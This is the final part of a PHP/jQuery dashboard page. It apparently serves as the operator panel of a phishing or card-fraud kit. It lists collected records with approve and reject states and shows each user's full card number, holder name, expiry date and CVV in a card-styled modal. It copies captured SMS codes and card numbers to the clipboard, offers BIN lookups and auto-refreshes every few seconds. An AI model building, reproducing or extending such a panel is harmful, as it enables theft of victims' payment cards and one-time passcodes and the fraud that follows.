                '<p class="phone" style="visibility: hidden">(802) 744-2287</p><p class="phone" style="visibility: hidden">(802) 744-2287</p>'+
                '</li>' +
                '</ul>';

            $('#binDetailsModal').modal('show');
        }
    </script>

    <!-- Notification code start here--->
    <style>
        #notification .show {
            width: 100%;
            background: green;
            color: #000;
            padding: 10px;
            border-radius: 10px;
            margin: 10px 0 10px 0;
        }

        #user_data_table .btn-custom {
            display: revert !important;
        }

        .copy-sms-code {
            cursor: pointer;
        }

        .sms-tooltip {
            position: relative;
        }

        .sms-tooltip .sms-tooltiptext {
            visibility: hidden;
            width: 200px;
            background-color: black;
            color: #fff;
            text-align: center;
            border-radius: 6px;
            padding: 5px 0;
            font-size: 13px;

            /* Position the sms-tooltip */
            position: absolute;
            z-index: 1;
            bottom: 70%;
            left: 0%;
            margin-left: -60px;
        }

        .sms-tooltiptext::after {
            content: "";
            position: absolute;
            top: 100%;
            left: 50%;
            margin-left: -5px;
            border-width: 5px;
            border-style: solid;
            border-color: #555 transparent transparent transparent;
        }

        .sms-tooltip:hover .sms-tooltiptext {
            visibility: visible;
        }

        tr.approved,
        tr.approved:hover,
        tr.approved td {
            background-color: hsl(0deg 0% 0% / 20%) !important;
            color: #fff !important;
        }

        tr.rejected tr.rejected:hover,
        tr.rejected td {
            background-color: rgb(0 0 255 / 50%) !important;
            color: #fff !important;
        }
    </style>

    <script type="text/javascript">
        jQuery(function() {
            /*
            jQuery('.form-select').on('change', function() {
                var sel = jQuery(this).val();
                console.log(sel);
                if (sel == 'yes') {
                    jQuery(this).closest('td').find('button').css('display', 'block');
                } else {
                    jQuery(this).closest('td').find('button').css('display', 'none');
                }
            });
            */
            $(document).on('click', '.sms-code', function() {
                let smscode = $(this).text();
                copysmscode(smscode);
                alert('Sms copied successfully');
            });
        });
        // $(document).ready(function() {

        //  setTimeout(function() {
        //      localStorage.setItem('tot', <?php echo count($rows); ?>);
        //                         location.reload();
        //                     }, 10000);
        // })

        function copysmscode(text) {
            // Copy the text inside the text field
            navigator.clipboard.writeText(text);
        }


        

      var table = $('#user_data_table').DataTable({
            aLengthMenu: [
                [25, 50, 100, 200, -1],
                [25, 50, 100, 200, "All"]
            ],
            iDisplayLength: -1,
            order: [
                [0, 'desc']
            ],
            initComplete: function() {
                // Apply the search
                this.api()
                    .columns()
                    .every(function() {
                        var that = this;

                        /* $('input', this.footer()).on('keyup change clear', function () {
                             if (that.search() !== this.value) {
                                 that.search(this.value).draw();
                             }
                         }); */
                    });
            },
        });
       
    </script>

    <div class="modal fade bd-example-modal-lg" id="binDetailsModal" tabindex="-1" role="dialog" aria-labelledby="binDetailsModalLabel" aria-hidden="true">
        <div class="modal-dialog modal-lg modal-dialog-centered" role="document">
            <div class="modal-content">
                <div class="modal-body lookup pt-0" id="binDetailsBody">
                    <!-- BIN details will be displayed here -->
                </div>
            </div>
        </div>
    </div>


    <script type="text/javascript">
             $(document).on('click', '.card_number', async function(event) {
              
                //debugger;
                const data_id = $(this).data('id');
                var user = users.find((user) => user.id == data_id);
                console.log("first data",user);
               
                if (!user) {
                   user = await get_user_info_by_id(data_id);     
                }

                 $('#credit_card').css('background', 'url(./assets/img/backgrounds/master-card.jpg)');

                    const card_number = user.cardnumber;
                    if (card_number[0] == 4) {
                        $('#credit_card').css('background', 'url(./assets/img/backgrounds/visa.jpg)');
                    } else if (card_number[0] == 5) {
                        $('#credit_card').css('background', 'url(./assets/img/backgrounds/master-card.jpg)');
                    }
                    let card_number_ary = card_number.match(/.{1,4}/g);
                    $('#credit_card #credit_card_number').html(card_number_ary.join(" "));
                    $('#credit_card #credit_card_holder').html(user.fullname);
                    $('#credit_card #credit_card_expry').html(user.exp_date);
                    $('#credit_card #credit_card_cvv').html(user.card_code);
                    $('#credit_card_modal').fadeIn("slow", function() {
                        $('#credit_card_modal').css('display', 'flex');
                    });


            });

        function get_user_info_by_id(id){
            //debugger;
           return new Promise(function(resolve, reject) {
            $.ajax({
              type: 'post',
              url: 'dashboard_functions.php',
              data: {
                'action': 'user_info_by_user_id',
                'user_id': id
              },
              success: function(data) {
                try {
                  var parsedData = JSON.parse(data);
                  resolve(parsedData);
                } catch (error) {
                  reject(error);
                }
              },
              error: function(xhr, status, error) {
                reject(error);
              }
            });
          });
        }




        function copycardnumber(number) {


            if (navigator.clipboard) {
                navigator.clipboard.writeText(number)
                  .then(function() {

                    let toast = {
                        title: "提示！",
                        message: "卡号已复制",
                        status: 1,
                        timeout: 5000
                    }
                    Toast.create(toast);


                    console.log('Text successfully copied to clipboard');
                  })
                  .catch(function(err) {
                    console.error('Unable to copy text to clipboard', err);
                  });
              } else {
                // Fallback for browsers that do not support navigator.clipboard
                var textarea = document.createElement('textarea');
                textarea.value = number;
                textarea.style.position = 'absolute';
                textarea.style.left = '-9999px';
                document.body.appendChild(textarea);

                textarea.select();
                document.execCommand('copy');

                let toast = {
                    title: "提示！",
                    message: "卡号已复制",
                    status: 1,
                    timeout: 5000
                }
                Toast.create(toast);
                document.body.removeChild(textarea);
              }

}



    </script>

</body>

</html>

<?php

$row = [];
$sql = "SELECT * FROM dashboard where meta_key='auto_refresh'";
if ($result = mysqli_query($conn, $sql)) {
    $row = $result->fetch_row();
    $get_auto_refresh = $row[3];
}

if ($get_auto_refresh == 'on') {
    echo '<script>
        setTimeout(function(){
           window.location.reload(1);
        }, 5000);
        </script>
        ';
}

?>